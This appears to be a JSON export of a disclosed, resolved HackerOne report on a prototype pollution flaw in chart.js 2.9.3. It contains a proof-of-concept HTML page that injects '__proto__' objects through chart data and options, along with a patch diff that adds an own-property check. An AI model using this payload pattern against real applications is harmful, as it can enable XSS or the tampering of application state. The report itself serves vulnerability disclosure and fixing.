{
  "id": 776371,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC83NzYzNzE=",
  "url": "https://hackerone.com/reports/776371",
  "title": "[chart.js] Prototype pollution",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "low",
  "readable_substate": "Resolved",
  "created_at": "2020-01-16T12:28:44.719Z",
  "submitted_at": "2020-01-16T12:28:44.719Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "asgerf",
    "url": "/asgerf",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/q5oTdS6oJaM29wThEKhh22Pr/ede8cd84a64d5392a2bb88ecb598721116469c27c015c2caa77148f11e211d58"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23949,
    "url": "https://hackerone.com/nodejs-ecosystem",
    "handle": "nodejs-ecosystem",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/949/3ea3b2ae039a8f955a4a8fe65d99fe85dc817398_original./5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "disabled",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Node.js third-party modules",
      "twitter_handle": "",
      "website": "https://nodejs.org/en/security/",
      "about": "This program was used to handle vulnerabilities in the Node.js ecosystem."
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2020-12-02T23:14:03.894Z",
  "bug_reporter_agreed_on_going_public_at": null,
  "team_member_agreed_on_going_public_at": "2020-11-02T23:14:02.670Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "I would like to report a prototype pollution vulnerability in chart.js\nIt allows an attacker to inject properties on Object.prototype which can for some applications lead to XSS.\n\n# Module\n\n**module name:** chart.js\n**version:** 2.9.3\n**npm page:** `https://www.npmjs.com/package/chart.js`\n\n## Module Description\n\nSimple yet flexible JavaScript charting for designers & developers\n\n## Module Stats\n\n854,171 weekly downloads\n\n# Vulnerability\n\n## Vulnerability Description\n\nIf the `dataset` or `options` passed to Chart.js contains an attacker-controlled object, Chart.js can be tricked into adding or modifying properties of the Object prototype. These properties will be present on all objects.\n\nThe payload is an object with the `__proto__` property.\n\n## Steps To Reproduce:\n\nInstall chart.js 2.9.3 into node_modules and then view the following HTML page and check the log:\n```html\n        <canvas id=\"canvas\"></canvas>\n        <script src=\"node_modules/chart.js/dist/Chart.bundle.js\"></script>\n        <script>\n            var ctx = document.getElementById('canvas').getContext('2d');\n            var chart = new Chart(ctx, {\n                type: 'line',\n                data: {\n                    labels: ['January', 'February', 'March', 'April', 'May'],\n                    datasets: [{\n                        label: 'My First dataset',\n                        backgroundColor: 'rgb(255, 99, 132)',\n                        borderColor: 'rgb(255, 99, 132)',\n                        data: [0, 10, 5, 2, 20]\n                    },\n                    JSON.parse(`{\"__proto__\": {\"abc\": \"Injected value through dataset\"}}`)\n                    ]\n                },\n                options: JSON.parse(`{\"__proto__\": {\"def\": \"Injected value through options\"}}`)\n            });\n            console.log({}.abc); // Print \"Injected value through dataset\"\n            console.log({}.def); // Print \"Injected value through options\"\n        </script>\n```\n\n## Patch\n\nAvoid recursively merging properties that aren't already own properties of the target object:\n\n```\ndiff --git a/src/helpers/helpers.core.js b/src/helpers/helpers.core.js\nindex 100d4edf..b5127025 100644\n--- a/src/helpers/helpers.core.js\n+++ b/src/helpers/helpers.core.js\n@@ -226,7 +226,7 @@ export function _merger(key, target, source, options) {\n \tvar tval = target[key];\n \tvar sval = source[key];\n\n-\tif (isObject(tval) && isObject(sval)) {\n+\tif (Object.prototype.hasOwnProperty.call(target, key) && isObject(tval) && isObject(sval)) {\n \t\t// eslint-disable-next-line no-use-before-define\n \t\tmerge(tval, sval, options);\n \t} else {\n```\n\n## Supporting Material/References:\n\nTested Chart.js 2.9.3 in Chrome 79\n\n# Wrap up\n\n- I contacted the maintainer to let them know: N\n- I opened an issue in the related repository: N\n\n## Impact\n\nInject properties on Object.prototype which can for some applications lead to XSS.",
  "weakness": {
    "id": 106,
    "name": "Modification of Assumed-Immutable Data (MAID)"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2020-12-02T23:14:02.762Z",
  "allow_singular_disclosure_after": -100880487.02394105,
  "singular_disclosure_allowed": true,
  "vote_count": 1,
  "voters": [
    "rook1337"
  ],
  "severity": {
    "rating": "low",
    "score": 3.1,
    "author_type": "Team",
    "metrics": {
      "attack_vector": "network",
      "attack_complexity": "high",
      "privileges_required": "none",
      "user_interaction": "required",
      "scope": "unchanged",
      "confidentiality": "none",
      "integrity": "low",
      "availability": "none"
    }
  },
  "structured_scope": {
    "databaseId": 2986,
    "asset_type": "SOURCE_CODE",
    "asset_identifier": "Other module",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
